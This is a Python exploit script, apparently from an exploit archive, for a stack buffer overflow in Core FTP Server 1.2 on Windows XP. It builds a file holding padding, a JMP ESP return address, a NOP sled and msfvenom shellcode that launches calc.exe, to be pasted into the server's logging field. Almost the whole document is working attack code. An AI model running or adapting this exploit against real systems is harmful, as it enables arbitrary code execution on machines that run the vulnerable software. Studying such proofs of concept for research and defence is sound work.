#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = Core FTP Server version 1.2                                                 #
# Download Link = http://www.coreftp.com/server/                                              #
# Date          = 8/21/2017                                                                   #
# Reference     = https://www.exploit-db.com/exploits/39480/                                  #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows XP SP3 - Professional                                               #
# EIP Offset    = 312                                                                         #
# Badchars      = "\x00\x0A\x0D"                                                              #
# RET Address   = 0x7e429353 : "\xFF\xE4" | [USER32.dll]                                      #
# Usage         = Insert Evil_Payload.txt content into Logfilename (include path) field under #                     
#                 Setup> New> Logging Options> More                                           #
#---------------------------------------------------------------------------------------------#

import struct
import time

f=open("Evil_Payload.txt","w")

#------------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0A\x0D" -f python -v payload #
#------------------------------------------------------------------------------#

payload =  ""
payload += "\xbb\x3e\x37\x28\xc3\xdb\xd6\xd9\x74\x24\xf4\x5a"
payload += "\x31\xc9\xb1\x31\x83\xea\xfc\x31\x5a\x0f\x03\x5a"
payload += "\x31\xd5\xdd\x3f\xa5\x9b\x1e\xc0\x35\xfc\x97\x25"
payload += "\x04\x3c\xc3\x2e\x36\x8c\x87\x63\xba\x67\xc5\x97"
payload += "\x49\x05\xc2\x98\xfa\xa0\x34\x96\xfb\x99\x05\xb9"
payload += "\x7f\xe0\x59\x19\xbe\x2b\xac\x58\x87\x56\x5d\x08"
payload += "\x50\x1c\xf0\xbd\xd5\x68\xc9\x36\xa5\x7d\x49\xaa"
payload += "\x7d\x7f\x78\x7d\xf6\x26\x5a\x7f\xdb\x52\xd3\x67"
payload += "\x38\x5e\xad\x1c\x8a\x14\x2c\xf5\xc3\xd5\x83\x38"
payload += "\xec\x27\xdd\x7d\xca\xd7\xa8\x77\x29\x65\xab\x43"
payload += "\x50\xb1\x3e\x50\xf2\x32\x98\xbc\x03\x96\x7f\x36"
payload += "\x0f\x53\x0b\x10\x13\x62\xd8\x2a\x2f\xef\xdf\xfc"
payload += "\xa6\xab\xfb\xd8\xe3\x68\x65\x78\x49\xde\x9a\x9a"
payload += "\x32\xbf\x3e\xd0\xde\xd4\x32\xbb\xb4\x2b\xc0\xc1"
payload += "\xfa\x2c\xda\xc9\xaa\x44\xeb\x42\x25\x12\xf4\x80"
payload += "\x02\xec\xbe\x89\x22\x65\x67\x58\x77\xe8\x98\xb6"
payload += "\xbb\x15\x1b\x33\x43\xe2\x03\x36\x46\xae\x83\xaa"
payload += "\x3a\xbf\x61\xcd\xe9\xc0\xa3\xae\x6c\x53\x2f\x1f"
payload += "\x0b\xd3\xca\x5f"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer =  "A" * 312
buffer += struct.pack('<L', 0x7e429353)
buffer += "\x90" * 30
buffer += payload
buffer += "B" * (1500-312-4-40-len(payload))

try:
  f.write(buffer)
  print "[+] Writing %s bytes to Evil_Payload.txt .." %len(buffer)
  time.sleep(1)
  f.close()
  print "File created"
except:
  print "File cannot be created"
